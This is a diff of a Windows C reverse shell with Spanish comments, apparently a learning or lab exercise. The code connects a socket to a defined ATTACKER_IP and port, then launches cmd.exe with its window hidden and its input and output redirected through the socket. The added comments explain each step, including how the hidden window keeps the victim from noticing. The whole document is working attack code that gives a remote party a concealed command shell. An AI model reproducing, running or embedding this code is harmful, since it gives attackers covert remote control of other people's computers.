@@ -3,65 +3,68 @@
 #include <stdio.h>
 #include <ws2tcpip.h>
 
-#define ATTACKER_IP "192.168.2.129"
-#define ATTACKER_PORT 4444
+#define ATTACKER_IP "127.0.0.1"
+#define ATTACKER_PORT 5000
 
 #pragma comment(lib, "ws2_32.lib")
 
 int main() {
-    WSADATA wsaData;
-    SOCKET sock;
-    struct sockaddr_in server;
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-
-    printf("Iniciando reverse shell...\n");
-    
     // Initialize Winsock
+    WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         printf("Error inicializando Winsock\n");
         return 1;
     }
-    printf("Winsock inicializado correctamente\n");
 
     // Create socket
+    SOCKET sock;
     sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     if (sock == INVALID_SOCKET) {
         printf("Error creando socket: %d\n", WSAGetLastError());
         WSACleanup();
         return 1;
     }
-    printf("Socket creado correctamente\n");
 
-    // Set up server address
+    // Connect     
+    struct sockaddr_in server;
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
     server.sin_port = htons(ATTACKER_PORT);
-
-    printf("Intentando conectar a %s:%d\n", ATTACKER_IP, ATTACKER_PORT);
     
-    // Connect to attacker
     if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
         printf("Error conectando: %d\n", WSAGetLastError());
         closesocket(sock);
         WSACleanup();
         return 1;
     }
-    printf("Conectado exitosamente al servidor\n");
 
-    // Resto del código...
     // Set up process information
+    STARTUPINFO si;             // Configuración de cómo quiero que se inicie cmd.exe
+    PROCESS_INFORMATION pi;     // Información sobre el proceso de cmd.exe que se creó
+    
+    // LIMPIA toda la estructura STARTUPINFO, llenándola de ceros (0x00)
     ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
+    // Asigna el tamaño de la estructura STARTUPINFO al campo cb
+    // Esto es OBLIGATORIO - Windows usa este valor para verificar la versión de la estructura
+    si.cb = sizeof(si); 
+    // Configura los flags que indican qué campos de la estructura están activos:
+    // STARTF_USESTDHANDLES - Habilita el uso de handles personalizados para entrada/salida
+    // STARTF_USESHOWWINDOW - Habilita la configuración de visibilidad de la ventana
     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    // Establece que la ventana del proceso se cree en estado oculto
+    // Esto evita que aparezca una ventana de cmd.exe visible para el usuario
     si.wShowWindow = SW_HIDE;
+    // REDIRECCIÓN CRÍTICA: Asigna el socket como los tres canales de comunicación del proceso
+    // hStdInput  - La entrada (comandos) vendrá del socket en lugar del teclado
+    // hStdOutput - La salida normal se enviará al socket en lugar de la pantalla  
+    // hStdError  - Los mensajes de error se enviarán al socket en lugar de la pantalla
+    // (HANDLE)sock - Convierte el socket en un handle de Windows válido
     si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
 
     // Start cmd.exe
     if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
         printf("Proceso cmd.exe iniciado\n");
         
-        // Wait for the process to exit
         WaitForSingleObject(pi.hProcess, INFINITE);
         
         // Clean up
